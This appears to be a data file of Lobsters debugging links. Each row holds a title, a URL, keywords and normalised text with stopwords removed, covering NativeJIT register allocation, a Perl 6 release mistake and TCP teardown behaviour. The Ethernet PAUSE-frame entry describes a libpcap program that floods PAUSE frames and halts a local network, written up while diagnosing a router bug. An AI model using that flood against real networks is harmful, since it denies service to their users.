538,Lobsters,debugging,Debugging,What really happened on Mars? (1997),http://research.microsoft.com/en-us/um/people/mbj/Mars_Pathfinder/Mars_Pathfinder.html,really happened mar,information card foundation openid foundation usenix association computing research association microsoft research asia image carnegie mellon university mach project posix,michael b jones director identity partnership microsoft working broad coalition people across multiple industry build internet missing identity layer represents microsoft information card foundation openid foundation board director completed term president usenix association board director board member computing research association cra member system networking research group microsoft research research covered diverse topic operating system distributed system including scalable peertopeer based event notification realtime scheduling open system designing early distributed faulttolerant video server organized chaired numerous computer science research conference large set publication authored patent covering diverse set invention active director asia image specialty stock photography company michael earned phd computer science carnegie mellon university member mach project technical reviewer posix thread standard interest include digital identity privacyprotecting system distributed system networking operating system adaptive realtime system musical performance outdoor activity fellow human being
540,Lobsters,debugging,Debugging,Your Debugger Is Obsolete,http://timkellogg.me/blog/2016/09/06/debugger-obsolete,debugger obsolete,latency failure dependency feature traffic profile system health autoscaling,tue september debugger used super useful today usually sign know debugger still good debugging serial code day code asynchronous distributed many host concept stepping code asynchronous system stepping implies single thread running single machine today use metric metric observe failure hundred host simultaneously witness starvation event begin end entire fleet visual graph explain happened look period high latency correlate new profile traffic considered thing put metric latency obviously request latency also usually different subsection request help troubleshoot slowness failure record failure order calculate availability also put counter different class failure assert statement counter dependency like child great hope dream end disappoint record latency availability feature customer actually use get stuck often traffic profile record big request response many element array great understanding load coming sort mitigation appropriate system health record cpu memory disk network usage find jvm high number garbage collection reliable indicator unhealthy host high cpu memory usage alarm first step toward service manage alarm event notify something went wrong better yet fix problem automatically aws autoscaling api killer spin instance notice traffic spike unhealthy host decommission automatically event great upside new world metric debugger thing go wrong find first server instead customer back debugger relevant found issue support ticket much proactive test also helped make debugger obsolete find need replicate issue high componentlevel functionallevel test process figuring went wrong usually write unitlevel test meantime use metric log line understand internal state figure thing going wrong unlike ide debugger debugging session recorded rerun forever still need debugger chance code simply complex need major refactoring absolutely write unit test metric work blind production part application much request handler start might notice debugger le useful system asynchronous enough process launching internet thing make extremely difficult launch debugger device software run screen fleet device whole class problem happen never heard learn debug application metric way successful future
542,Lobsters,debugging,Debugging,Debugging unfamiliar code in an unfamiliar language using an unfamiliar IDE,http://bitfunnel.org/debugging-nativejit/,debugging unfamiliar code unfamiliar language using unfamiliar ide,debugging unfamiliar code mathjax bitfunnel project nativejit nativejit available free recursively look node computes many register expects node use expressiontreedeclsh conclusion rtags codebase,debugging unfamiliar code fri apr note site us mathjax render mathematical equation enabling javascript browser allow mathjax display equation page story debugging register allocation issue compiler recently joined bitfunnel project much documentation time started playing code writing simple example could later serve documentation anyone else coming first thing tried nativejit selfcontained first thing open sourced surprise compiling simplest example could think function computes area circle exposed two optimization bug since trying transparent put example readme started looking debugging bug time pretty much totally unfamiliar codebase also used writing software window seemed like good opportunity explore codebase bit learn standard visual studio devdebugging workflow work window let look example tried compile computes pi r r c since nativejit c area expression take single float parameter return float f r pi r r function float float expression allocator code multiply input parameter get radius squared auto rsquared expressionmul multiply pi const float pi auto area expressionmul rsquared expressionimmediate pi compile expression function auto function expressioncompile area run expression float radius std cout area circle radius radius function radius api build expression tree call compile tree get function call call function compiler used bing expression tree built programmatically case going manually construct mul node computes r r construct another mul node take output first mul node multiplies pi think code generated expect parameter r passed input parameter register maybe expect multiplied produce r r multiplied constant pi returned register look assembly output see something strange going piconstant db pi stored memory constant entrypoint sub rsp standard function prologue mov qword ptr rsp rbp standard function prologue movaps xmmword ptr rsp standard prologue save lea rbp rsp movss input parameter r mulss r r mulss dword ptr piconstant pi pi r r movss return value xmm movaps xmmword ptr rsp standard function epilogue restore mov rbp qword ptr rsp standard function epilogue add rsp standard function epilogue ret code correctly computes result pi r r multiply instruction instead window using standard calling convention saved callee used cause u save restore memory memory function two load one store one storeload stack pointer one load constant pi three load two store everything expect plus extra store load let try figure used want follow along home commit nativejit inside areaofcircle example using visual studio community edition available free also follow along gdb lldb whatever favorite debugger let set breakpoint jit compilation step see happens compilation following along visual studio right click project select set startup project make debugger run project left click grey area next line code set breakpoint hit run debugger step line executed compile method called function pointer nonsense value instruction int ie software interrupt debug build vc fill unitialized memory obvious sign something went wrong example accidentally execute memory want verify assembly output think step compile method grab address function variable point compile output executable code look address let take look disassembly view debugger interpret pile byte assembly ctrlaltd get dissassembly paste function address address bar see disassembly function compiled bug expected move mulss done result copied back surrounded standard vc since successfully reproduced bug start trying debug familiar code might able figure source bug inspection since least since let try restarting debugger stepping compile method see happening jit function stop current debug session start new one go back breakpoint step function called current line template typename r typename typename function r functiontype function r compile node r value stepped line template return r value expressiontree compile return getentrypoint might look bit weird familiar c template purpose post think template text substitution system recall function type float float mean return type r float parameter type also float funny syntax around template r value two explanation mean accessing member pointer would accessed value pointer word template disambiguate r template added late game c resulted large number wart least r could mean le r start template parameter named r see calling return method peek return see anything particularly interesting probably look compile see going step step void expressiontree compile debugger stepped line mcodereset mstartofepilogue mcodeallocatelabel generate constant generate code mcodebeginfunctionbodygeneration print mcodeplacelabel mstartofepilogue mcodeendfunctionbodygeneration spec release reserved register mreservedregisterspinsclear mreservedxmmregisterstoragesclear mreservedrxxregisterstoragesclear print peek mcodereset click reset press look around later ctrl go back see initialization thing much work mcodeallocatelabel see allocates label local jump table also seems like unlikely cause bug look see something bit interesting click void expressiontree isdiagnosticsstreamavailable getdiagnosticsstream std endl top look like kind diagnostic disabled let try enabling running outside debugger see sort information get diagnostics enabled click isdiagnosticsstreamavailable bool expressiontree isdiagnosticsstreamavailable const return mdiagnosticsstream nullptr need set mdiagnosticsstream something nonnull enable diagnostics figure set let look getdiagnosticsstream work ctrlminus go back click getdiagnosticsstream getdiagnosticstream return mdiagnosticsstream ie dereferences mdiagnosticsstream point let figure initialized click go definition left click isdiagnositicsstreamavailable ctrlshiftf find file click mcodeisdiagnosticsstreamavailable scroll see enablediagnostics method let u pas reference stream pas one constructor directly expressiontree expressiontree allocator iallocator allocator functionbuffer code mallocator allocator mstlallocator allocator mcode code mdiagnosticsstream nullptr get diagnostics stdout let use standard c cout changingnullptr std cout make change code stop debugger run parameter parameternode id parent register count cached register position topological sort parameternode id parent register count cached register position operation imul id parent register count cached left right immediatenode ripindirect id parent register count cached value operation imul id parent register count cached left right returnnode id parent register count cached rxx register rax free rcx free rdx free rbx free rsp use rbp use rsi free rdi free free free free free free free free free rip use xmm register use free free free free free free free free free free free free free free free temporary used temporary still use parameter parameternode id parent register count cached position topological sort parameternode id parent register count cached position operation imul id parent register count cached left right immediatenode ripindirect id parent register count cached value operation imul id parent register count cached left right returnnode id parent register count cached rxx register rax free rcx free rdx free rbx free rsp free rbp free rsi free rdi free free free free free free free free free rip free xmm register free free free free free free free free free free free free free free free free temporary used temporary still use area circle radius press key continue lot output look register free list see use free point debug information use recall stepped compile call print immediate another call print end let try adding call print pas see get enough diagnostic information see incorrectly deciding allocate insert print pas lot look going going paste information rxx register although pretty curious diagnostic dump instruction pointer rip allocated free could mean digression bug debug let look got xmm register parameter parameternode id parent register count cached position topological sort parameternode id parent register count cached position operation imul id parent register count cached left right immediatenode ripindirect id parent register count cached value operation imul id parent register count cached left right returnnode id parent register count cached xmm register free free free free free free free free free free free free free free free free temporary used temporary still use parameter parameternode id parent register count cached position topological sort parameternode id parent register count cached position operation imul id parent register count cached left right immediatenode ripindirect id parent register count cached value operation imul id parent register count cached left right returnnode id parent register count cached xmm register free free temporary used temporary still use parameter parameternode id parent register count cached register position topological sort parameternode id parent register count cached register position operation imul id parent register count cached left right immediatenode ripindirect id parent register count cached value operation imul id parent register count cached left right returnnode id parent register count cached xmm register use free temporary used temporary still use parameter parameternode id parent register count cached register position topological sort parameternode id parent register count cached register position operation imul id parent register count cached left right immediatenode ripindirect id parent register count cached value operation imul id parent register count cached left right returnnode id parent register count cached xmm register use free temporary used temporary still use parameter parameternode id parent register count cached position topological sort parameternode id parent register count cached position operation imul id parent register count cached left right immediatenode ripindirect id parent register count cached value operation imul id parent register count cached left right returnnode id parent register count cached xmm register free free temporary used temporary still use area circle radius press key continue look free list still see point allocated least know even allocate unlikely contain source bug allocated let step debugger click step step see parameter call something called codegencache single parameter debugger tell u size mparameters container parameter parentcount seems reasonable know function take one parameter r make sense referenced twice getparentcount seems unlikely interesting let step codegencache click line template typename void node codegencache expressiontree tree logthrowassert getparentcount evaluate node u parent getid logthrowassert hasbeenevaluated tried codegenvalue node id u getid markevaluated labelsubtree true setcache codegenvalue tree quickly peek function markevaluated labelsubtree codegenvalue setcache click ctrlminus see interesting work setting value see parameter section diagnostic dump looked earlier let skip node codegencache mouse next loop see loop going fall skip look skip print void expressiontree isdiagnosticsstreamavailable getdiagnosticsstream std endl unsigned mtopologicalsortsize nodebase node mtopologicalsort nodegetparentcount nodehasbeenevaluated nodecodegencache look superficially similar pas except call method node one parent instead calling one node parameter plausible bug could since bug involves node two identical parent step function see node getparentcount marked evaluated pas anything bug unlikely leave check skip print void expressiontree isdiagnosticsstreamavailable getdiagnosticsstream std endl nodebase root mtopologicalsortback logthrowassert root node return root must return node rootlabelsubtree true rootcompileasroot order avoid making post unreasonably long hah give spoiler tell trace happening labelsubtree recursively look node computes many register expects node use seem cause actual register allocation let skip compileasroot click template typename void returnnode compileasroot expressiontree tree expressiontree storage codegen tree auto resultregister treegetresultregister move result result register unless already sgetstorageclass storageclass direct sgetdirectregister issamehardwareregister resultregister codegenhelpers emit opcode mov treegetcodegenerator resultregister look promising comment saying move result result register unless already probably indicates code block underneath comment well move result result register unless already codegenhelpers emit appears emit actual opcode able execute given bottom block emitting actual code pass seen far set value member codegen call top function probably emits actual code function possible bug one earlier pass setting value currently obvious value changed possible figure value set incorrectly see bogus mov opcode emitted since know opcode emitted let step codegen tree template typename typename expressiontree storage node codegen expressiontree tree iscached codegencache tree return getandreleasecache wait happened call codegencache look pretty similar saw earlier pass well let step codegencache see different click put u codegencache welp let step codegenvalue see tha different click template typename typename expressiontree storage returnnode codegenvalue expressiontree tree logthrowassert getparentcount unexpected parent count root node u getparentcount return mchildcodegen tree actually different saw looked codegencache last time look local variable debugger see returnnode apparently calling codegenvalue method returnnode call codegen tree passed look tree debugger tree seems value set previous pass let step codegen see click look familiar call codegencache step click codegencache look local variable see binarynode float float instead areturnnode see let look atbinarynodeclick look definition ofopcodeclick anenum animul enum class opcode unsigned add call cmp imul lea mov movsx movzx movap aligned sse move nop pop push ret rol shl note shl sal alias unlike shr sar shld shr sub xor following value must last one opcodecount bit strange since imul mean integer multiply node take two float operation convert float integer visa versa named opcodes thing like shld weirdo thing general concept based list opcodes fact know nativejit emit floating point code going guess time nativejit supported integer operation floating point support added instructionmethod name got overloaded let go next codegenvalue see take u click template opcode op typename l typename r typename expressiontree storage l binarynode op l r codegenvalue expressiontree tree storage l sleft storage r sright codegeninpreferredorder tree mleft sleft mright sright codegenhelpers emit op treegetcodegenerator sleftconverttodirect true sright return sleft look interesting really need know storage click storage take u expressiontreedeclsh almost line long consists mostly comment bit long paste reading comment interpretation storage thing keep track particular piece data stored direct register indirect somewhere memory immediate immediate field instruction next thing would step codegeninpreferredorder accidentally pressed instead stepped oops could fix setting breakpoint codegeninpreferredorder restarting let look around see codegeninpreferredorder click void nodebase codegeninpreferredorder expressiontree tree node storage node storage evaluate expression us register first tree tree else tree tree look like recursively call codegen starting root tree going sound maybe important let look else call level first ctrlminus converttodirect highly suspicious chunk code click case storageclass direct storage already direct action necessary need modified sole owner issoledataowner formodification auto dest treedirect possibility current register may get spilled allocation move storage instead register codegenhelpers emit opcode mov code destgetdirectregister setdata dest break refer use register modification sole owner copy mov register elsewhere modifying let look mean sole owner template typename bool expressiontree storage issoledataowner const return isnull mdata getrefcount something ref count modifier sole owner seems likely bug related bug parameter two node pointing ref count fail issoleowner check lot possible fix let try simple local fix see fix problem think making different fix like local fix aincnativejitnodesbinarynodeh bincnativejitnodesbinarynodeh namespace nativejit storage r sright codegeninpreferredorder tree mleft sleft mright sright codegenhelpers emit op treegetcodegenerator sleftconverttodirect true sright mleft sleft mright sright sleft sright srightreset codegenhelpers emit op treegetcodegenerator sleftconverttodirect true sleft else codegenhelpers emit op treegetcodegenerator sleftconverttodirect true sright two storage free one reducing ref count make issoleowner condition true let try rerunning fix see pi r r produce code want stop debugging inspect output function int int sub mov qword ptr rsp rbp lea rbp mulss mulss dword ptr mov rbp qword ptr rsp add ret int int great mov gone fact produce pi r r fix seems nonoptimal example pi r r r r could theoretically done mulss mulss mulss pi generalize fix always use register always refer register since actually emit code pi r r r possible correct optimization pi pi one main design goal nativejit make optimization nontrivial used bing compile query time take compile something critical dumbfast register allocation algorithm chosen might possible make change without impacting compilation performance immediately obvious seems like ok fix back original output see actually second bug lurking piconstant db pi stored memory constant entrypoint sub rsp standard function prologue mov qword ptr rsp rbp standard function prologue movaps xmmword ptr rsp standard prologue save lea rbp rsp movss input parameter r mulss r r mulss dword ptr piconstant pi pi r r movss return value xmm movaps xmmword ptr rsp standard function epilogue restore mov rbp qword ptr rsp standard function epilogue add rsp standard function epilogue ret already seen fixed bug cause second register used bug given second register used nativejit selects callee save register ie register called function save might used calling function correct thing use caller save register none available use callee save register last resort although fun exploring codebase figuring bug going write conclusion pleasantly surprised find easy debug bug unfamiliar codebase using language much experience helped code pretty much selfcontained problem make code really hard understand nondescriptive variable function name globals long function obvious purpose etc using ide also really helpful low expectation coming vc frankly nice compiler clang gcc worse error message worse standard compliance etc really noticeable debugging ide integration quite good last time c c used emacs ctags etags navigation ok ctags etags fundamentally rely string matching often result incorrect symbol resolution look like something called rtags us clang generate relationship symbol work advertised happy switch visual studio pretty heavyweight iirc installer community edition even install c compiler opened c project run weird bug guessing stem complexity hit bug debugging finished window forced update required restart caused v get broken state opened v tried restart v gave error message told restart able restart also run bug using gdb lldb one debugging session really enough say v buggier term codebase relatively easy understand heavily templated c code considering done c age looking forward working codebase thanks lisa neigut darius bacon leah hanson julia evans mike hopcroft david turner commentscorrectionsdiscussion julia evans pair programming part debugging process
544,Lobsters,debugging,Debugging,Q&A with Diomidis Spinellis on Effective Debugging,https://www.infoq.com/articles/book-review-effective-debugging,q diomidis spinellis effective debugging,key takeaway effective debugging excerpt effective debugging infoq made decide write book debugging diomidis code reading tom morris work book author diomidis coolsweng,key takeaway effective debugging depends mindful application right strategy method practice tool technique locate reproduce bug detailed logging failure reporting defensive programming specialized tool fixing one fault find fix similar one take step ensure occur future explaining failing code snippet colleague help discover error pinpoint elusive bug static dynamic program analysis tool book effective debugging diomidis spinellis describes different approach effective debugging application system provides method strategy technique tool finding removing fault give example using different setting infoq reader download excerpt effective debugging infoq interviewed spinellis different approach debugging software using different compiler execution platform help debug software reproducing failure find fix similar fault solving failure better use graphical user interface debugging involve colleague want find fault code using static program analysis tool dynamic analysis tool debug code programmer develop debugging skill infoq made decide write book debugging diomidis spinellis love coding way challenge mind year ago recognized debugging even difficult interesting task whereas coding mainly translation requirement program statement debugging involves many different creative approach also found code reading debugging rarely taught written point started observing whenever debugged something kept note regarding approach used surprised many approach found way list list grew grew thus realized many would benefit expanded list book effective programming series matched perfectly material put together privileged proposal accepted project within series infoq book intended spinellis wrote book intermediate advanced programmer people know code significant formal training debug code nowadays code often end running service app rather program performs processing terminates therefore also aimed book devops staff system administrator also face debugging task day item book use breakpoints debugger stack traversal command fairly basic included found programmer often employ debugging approach specific platform use consequently even advanced programmer may familiar debugging method others routinely use infoq different kind approach debugging software described book spinellis start book three chapter containing item applicable debugging task highlevel strategy involve way approach problem narrowing difference working system failing one generalpurpose method practice help become better debugging problem one important practice category automate testing scenario task increase efficiency often open opportunity expressing complex debugging scenario come generalpurpose tool technique apply diverse debugging task include effective use unix commandline tool editor revision control system tracing tool next four chapter detail platformspecific method use debugger narrow bug tweaking program code well technique apply building system run although exact detail method depend platform platform offer tool static program analyzer profilers help pinpoint specific class bug infoq using different compiler execution platform help debug software spinellis manufacturer test new car model kind condition arctic tundra sahara desert help uncover bug able find driving around car plant parking lot similar idea applies software modern language apis large complex different compiler runtime platform stress software diverse way example one compiler may happily accept code cause program behave unspecified manner whereas another issue warning encounter code go api implementation one may mysteriously misbehave incorrect argument another may immediately raise helpful exception even cpu diversity help accessing twobyte value odd memory address generate fault arm cpu others may result nonatomic behavior interesting case occurred unix running popular vax architecture written way access null pointer return zero sort bug surfaced sun microsystems changed behavior system modern practice result runtime exception infoq reproduce failure spinellis reliably efficiently reproduce failure least half way effort required fix bug two main approach reproducing failure one involves starting complex scenario lead failure gradually simplifying approach come guess regarding failure cause build scenario reproduces approach lead small tractable test case cause failure detailed logging failure reporting defensive programming often guide action small test case hand drastically cut work required debug problem stepthrough ten code line rather hundred inspect screenfull log data rather torrent zoominto key variable rather program global state run test case second rather hour recently debugging failure processing data file close terabyte size whose processing took day solve first added processing program many debugging option generated detailed log also added many internal consistency check corresponding reporting thus able narrow problem gigabyte data would fail le minute processing wrote small filter would isolate data leading failure record likely involved reduced suspect data kilobyte size could manually inspect pinpoint problem ensure solution correct would stay future also added test case modeling error verified program handled correctly let end mentioning number specialized tool approach help encounter bug hard reproduce include post mortem debugging debug code using memory image crashed program capture replicate tool work wonder nondeterministic bug multithreaded code backintime debugging useful step rarely failing function call infoq solving failure find fix similar fault spinellis making important point often case fault occur one place happen haphazard copypasting code api easily misused sign professionalism find fault understand occurred find fix similar one ensure others like crop future often find similar fault searching code regular expression match suspect code favorite editor ide though prefer use purpose unix commandline tool grep specifying pipeline pattern match fault reported pattern ignore pas instance grep easily narrow search case matter fixing case save colleague work involved debugging potential failure ensuring similar fault occur future challenging fault related misuse api function one trick create wrapper catch report error testing also see whether configure code analysis tool catch error continuous integration infoq better use graphical user interface debugging spinellis although love command line interface find productive use debugging one task believe almost always better performed gui reason debugging benefit simultaneous presentation diverse data source code local variable call stack log message even cpu register graphical interface allows displayed separate window updated concurrently also pointing mouse variable code line call stack frame typically much efficient specifying typing sometimes find debugging system lack gui debugger improvise one setup desktop commandline editor window one window may contain relevant source code another list test data another display continuous update log file another may offer commandline prompt infoq involve colleague want find fault code tom morris work spinellis effective way probably rubber duck technique involves explaining code work someone else typically halfway explanation exclaim oh wait silly problem done happens rest assured silly mistake carelessly overlooked explaining code colleague engaged different part brain pinpointed problem case colleague play minimal role technique get name explaining problem rubber duck could equally effective also formal way colleague help catch bug pair programming code review case even engage roleplay example debugging communication protocol take role one party colleague take role take turn attempting break protocol trying make work area effective security get play bob alice humancomputer interaction workflow passing around physical object edit token help infoq advice using static program analysis tool spinellis static program analysis tool analyze program find many type problem formatting glitch think pylint python code code construct cause program crash misbehave coverity findbugs two wellknown tool area another underappreciated tool category compiler interpreter command line option eg wall wextra many compiler statement eg use strict javascript code trigger many useful warning message start scratch area advice first configure tool use produce warning consistent practice organization example reason already many method differ capitalization might want disable findbugs confusing method name message level warning adjusted choose highest level drown warning thing unlikely fix methodically remove warning may fix fault looking also make easier see fault future finally ensure build continuous integration process run static program analysis tool code regress future infoq use dynamic analysis tool debug code spinellis dynamic program analysis tool deliver ultimate truth regarding code analyze run typically run program tool view report produce example valgrind find memory leak illegal memory access use uninitialized memory execution profilers built modern ides well standalone tool eg visualvm jprofiler java mission control help locate performance hog tool intel inspector let find deadlock race condition one underappreciated category dynamic analysis tool execution tracer display program interaction operating system runtime system library example tool include ltrace strace ktrace truss systemtap various unix flavor well process monitor window beauty tool apply executable program without requiring source code saved countless time revealing particular program fails infoq programmer develop debugging skill spinellis airline pilot often report experience proficiency term flight hour debugging programming skill also depend lot time spend activity however mindful debugging rather randomly throwing dart bug make big difference effectiveness development debugging skill includes carefully deliberately choosing best approach attack problem investing environment make productive setting learning apply specialized tool studying deeply understand language feature apis used code book author diomidis spinellis professor department management science technology athens university economics business written two awardwinning widelytranslated book code reading code quality open source perspective book effective debugging spinellis served decade member ieee software editorial board authoring regular tool trade column contributed code ship apple o x bsd unix developer umlgraph cscout opensource software package library tool hold meng software engineering phd computer science imperial college london spinellis senior member acm ieee january serving editorinchief ieee software previous life four time winner international obfuscated c code contest nowadays try keep code boring twitter coolsweng
545,Lobsters,debugging,Debugging,"Obscure Ethernet for $200 please, Alex: The Ethernet PAUSE frame",http://jeffq.com/blog/the-ethernet-pause-frame/,obscure ethernet please alex ethernet pause frame,ieee ethernet standard ethertype ethernet flow control great diagram frame github tplink archer mediatek driver perusable creative common attributionsharealike international license,bizarre one started internet seemed go house desktop phone tv everything stopped working usual solution time like power cycle modem router fixed situation temporarily soon problem returned made think isp flakiness reason chrome actually locked good ol window program stopped responding like enterprising engineer busted open wireshark odd frame clever deductive reasoning aka randomly unplugging cable router determined tv sending mystery frame yes tv sony android tv power cycling tv problem went away course wanted figure actually happening forgiven frame immediately recognizable definition buried deep appendix ieee ethernet standard type ethernet frame determined ethertype two byte identifier come two six byte mac address denoting source destination mystery frame ethertype ethernet flow control existence ethernet flow control may come shock especially since protocol like tcp explicit flow control mechanism presumably compensate ethernet lack one however page ethernet spec find section dedicated rudimentary flow control frame structure fairly barebones two byte opcode case pause two byte pausetime denoting increment bit time great diagram frame test behavior pause frame thoroughly wrote simple libpcap winpcap program transmits pause frame every ten millisecond include stdioh include stdlibh include stringh include unistdh include pcappcaph int main int argc char argv unsigned char pauseframe destination mac spanning tree bridge source mac null ethertype mac control opcode pause pausetime byte padding omitted open interface memset pauseframe fill padding pcapsendpacket fp pauseframe sizeof pauseframe fprintf stderr error sending frame sn pcapgeterr fp break usleep sleeptimems pcapclose fp return sure enough sending frame repeatedly killed traffic home network check full code github interesting may arisen bug home router tplink archer running firmware according ethernet spec globally assigned multicast address reserved use mac control pause frame inhibiting transmission data frame dte full duplex mode ieee lan ieee bridge forward frame sent multicast destination address regardless state bridge port whether bridge implement mac control sublayer would appear clause specifically attempt deal scenario node sending pause message special multicast address instructing switch send frame switch seems honor also forward frame node network effect telling pause sending frame would explain observed behavior digging router us mediatek router soc relies realtek perform switch duty unfortunately find data sheet specific chip although source code router gpl driver perusable data sheet port version chip say page frame group mac address pause lcap always filtered mac address always forwarded function controlled pin strapping enmltfwd pin upon power reset power configuration may changed mltidst register reached end road seems suggest forwarding pause frame controlled pin register ethernet switch chip would appear router specific standard conformant feature accidentally disabled either floating pin zeroed register leading frame death forwarded switch killing network amazing find dig work licensed creative common attributionsharealike international license
546,Lobsters,debugging,Debugging,I Botched a Perl 6 Release And Now a Robot Is Taking My Job,http://perl6.party/post/I-Botched-A-Perl-6-Release-And-Now-A-Robot-Is-Taking-My-Job,botched perl release robot taking job,part human make error rakudo release guide nqp release guide green go irc channel moarvm tag release man sky robocide fallout channel yapc europe git freenode part ii robot joel test channel web app spread build one step google compute engine api rakudo website exterminate human joel test conclusion,word automating release cycle deconfusion note regular perl user likely use ever heard rakudo star distribution includes rakudo perl compiler module doc post detail release compiler get released often rakudo star please nt think new release star use part human make error today third saturday month awesome day rakudo perl compiler see monthly release helm today chugged along rakudo release guide nqp release guide whose release part process well green go nearing end process first hint problem surfaced user joined irc channel tag seems missing nqp github repository zoffix created minute ago ensure got latest everything strange pull nqp checkout still nt see zoffix add tag git pull tag git fetch tag something like zoffix correct nt thanks zoffix ok usually need good question pulled fresh checkout ran full test suite sure everything passed luckily got answer rather quickly git log graph decorate originmaster master diverged tag commit parent nqp master story local nqp checkout bump version moarvm dependency tag release start full build test suite run lengthly process happening go github use online editor make minor tweak text nqp release guide test finish try push tag version bump get usual error saying online repo diverged instinctively run gr alias git pull rebase bring new change push work repo problem rebase nt move tag still referencing old commit clone repo everything appears work tag pull change existing repo nt get tag also git describe use midrelease nqpmoarvm version bump missing tag commit tag tagged parent master head point nt yet know breakage folk git pull existing branch continue release since test green finish relax departing fly man sky awesome robocide first hint wait second hint trouble showed latest commits appear eval bot supposed update head zoffix dd vmversion perlcompilerversion camelia rakudomoar output zoffix oh guess camelia nt build every commit right away create camelia unfamiliar working another bot create knew sure supposed update head every hour nt zoffix dd vmversion perlcompilerversion sourcebaby zoffix something wrong resolve caller sourcery nil none signature match thing str method capture c thing str method code code capture c block e line zoffix get bad feeling fallout nt wonder hell going long since shortly thereafter user channel turned saying ca nt build cuonglm hi anyone got trouble building rakudo release source got error pathspec match file know git sound like git history overriden short conversation person became obvious cloning building repo using release released may worked fine simply git pulling ran issue tag obvious issue needed fixing question first suggestion seemed scary mst always burn tag fire replace fixed one mst advantage may outweigh risk already user checkout broken tag asking help chat channel since sent release announcement email may many user experiencing checkout issue nt know first thing panic attempt find someone else fix mess zoffix jnthn coke timtoady around made booboo tag lot core devs europe bit timezone conflict yapc europe happening even chat time left device joined git freenode kind folk reaffirmed replacing tag might bad idea victory nt learn zoffix delete tag create new one happens people cloned branch incorrect tag ikke zoffix good question tag kind special expecting change git somewhat ignores changing tag remote ikke zoffix man git tag section retagging gitinfo zoffix gittag manpage available http jkgsgittaghtml zoffix ok think leave wait someone smarter figure fix p zoffix haha admit screwed use different name yup go p zoffix thanks help ikke yw tag mangling question user issue next answer make emergency point release corrected tag proceeded zoffix ok gon na cause sure changing tag fix everything wo nt introduce new problem making another nqp release correct tag seemed resolve issue box nt sure nt fallout happen current rakudo release made point release compiler well safe sync version nqp folk nt think rakudo release missing see nqp release jumping release guide midpoint proved challenging considering done release trying keep track step already done tired embarrassed sober occasion headed pub knowing last time make release like part ii robot heard joel test may noticed perl release process described currently fails item make build one step painfully aware issue thinking improving situation ever since first time stepped cut release follow channel may even seen show couple prototype web app let keep track releaseblocking bug ticket bot reminds upcoming release giving list new ticket since last release well changelog entry review zoffix reminder friend bear good news rakudo release happen day please update changelog anything worked known user stillopen new rt ticket since last release http git log output commits since last release http today incident indicated time stop messing around prototype put complete plan action spread two thing release guide contains may make seem like automating release tough nut crack reviewing bug ticket blocker populating changelog needed item ca nt make robot reliably thing yet largest part release process request human spread job throughout entire month release month create web app keep track reported ticket let release manager log mark ticket reviewed either release blocker nonblockers bonus prototype buggable bugqueue interfacing bot may seen also use app thing correctly app also serve nicer interface ticket people nt like original rt website principle apply changelog entry site keep track commits release manager reviewed added changelog keeping state around web app let release manager spend couple minute every day reviewing change bug instead cramming work single session release day build one step providing release manager keep step throughout month release day single thing issue release command bot zoffix release yey time starting release watch progress http tell abort time abort process since issue review process subtracted release instruction left grunt work entirely automated bot use google compute engine api fire dev box ssh clone repos update version run build run test tag stuff generate tarballs test tarballs scp tarballs rakudo website email release announcement update wikipedia page api human watch happen page feed websocket output proc async abort anything go wrong bot automatically abort test test suite fail bonus hoping make bot fire instance vms several different os add extra layer testing different environment granted least first several release safety stopmeasures verification step human ensure robot right thing abort process needed technical limitation bot correctly cutting release issued single command exterminate human automating complex build job eliminates mistake robot nt care rebuild scratch hundred time trying debug releaseblocker ok think nt care robot right activist audience tell wrong today mistake difficulty fixing could avoided release process entirely automated fewer thing manually fewer place mistake creep joel test amusing read lot truth simplicity suggest reevaluate point project fails test believe save lot headache conclusion today event great learning experience catalyst improvement human squishy fallable make mistake especially habit trying follow regular list instruction irregular situation prove difficult introduce mistake making bad situation worse nt yet try automate release process much know perl follow advice last time cut release job taken robot
547,Lobsters,debugging,Debugging,TCP Puzzlers,https://www.joyent.com/blog/tcp-puzzlers,tcp puzzler,dave pacheco car talk old java puzzler prerequisite tcp wikipedia page truss dtruss strace warmup normal tcp teardown shut one process happens process dtrace tcp provider snoop tcpdump conclusion puzzler power cycling happens established idle tcp connection one system power cycled suppose point kang try send data kodos happens posix definition read illumos read man page conclusion situation one side belief tcp connection established side situation never automatically resolved puzzler power happens one endpoint tcp connection powered conclusion puzzler broken connection failure possible kang connection kodos without kodos knowing indefinitely ie resolve even power power cycle failure operating system kodos failure networking equipment fin mean endofdatastream direction fin sent dnc perfectly valid state tcp connection indefinite period time happens kang sends data kodos point conclusion conclusion notion tcp connection span multiple system convenient fiction hiring,august dave pacheco share said nt really understand system understand fails despite written toy tcp implementation college working several year industry continuing learn deeply tcp work fails surprising basic failure obscure presenting puzzler fashion car talk old java puzzler like best puzzler question simple articulate solution often surprising rather focusing arcane detail hopefully elucidate deep principle tcp work prerequisite puzzler assume basic knowledge working tcp unixlike system nt mastered diving refresher tcp state threeway handshake used establish connection way connection terminated described pretty concisely tcp wikipedia page program typically interact socket using read write connect bind listen accept also send recv purpose work way read write talking program use poll although system use something efficient like kqueue event port epoll equivalent purpose application use blocking operation instead mechanism understand tcp failure mode affect poll pretty easy understand affect blocking operation well try example used two virtual machine running vmware fusion result match experience production system testing using nc tool smartos nt believe behavior shown osspecific using illumosspecific truss tool trace system call get coarse timing information may able get similar information using dtruss o x strace gnulinux nc pretty simple tool use two mode server mode nc set listening socket call accept block connection received client mode nc create socket establish connection remote server mode connected side us poll wait either stdin connected socket data ready read incoming data printed terminal data type terminal sent socket upon ctrlc socket closed process exit example client called kang server called kodos warmup normal tcp teardown one demonstrates basic case get ball rolling suppose set server kodos server root kodos truss bind listen accept poll read write nc l p base time stamp fri may utc bind sovsockbsd listen sovdefault accept sovdefault sleeping remember example using truss print system call nc make flag print relative timestamp flag selects system call want see kang establish connection client root kang truss connect pollsys read write close nc base time stamp fri may utc connect sovdefault pollsys sleeping kodos see server accept sovdefault pollsys sleeping point tcp connection state established process poll see using netstat tool system server root kodos netstat f inet p tcp n tcp local address remote address swind sendq rwind recvq state established client root kang netstat f inet p tcp n tcp local address remote address swind sendq rwind recvq state established question shut one process happens process find try predict specific syscall behavior explain system call let try ctrlc server kodos server pollsys sleeping received signal sigint pollsys default see kang client pollsys sleeping pollsys read close root kang happened let specific sent sigint server causing process exit upon exit file descriptor closed last file descriptor established socket closed tcp stack kodos sends fin connection enters state tcp stack kang receives fin packet transition connection closewait sends ack back since nc client blocked socket ready read kernel wake thread event pollin nc client see pollin socket call read return immediately indicates endofstream nc presumes done socket close meanwhile tcp stack kodos receives ack enters since nc client kang closed socket tcp stack kang sent fin kodos connection kang enters lastack tcp stack kodos receives fin connection enters 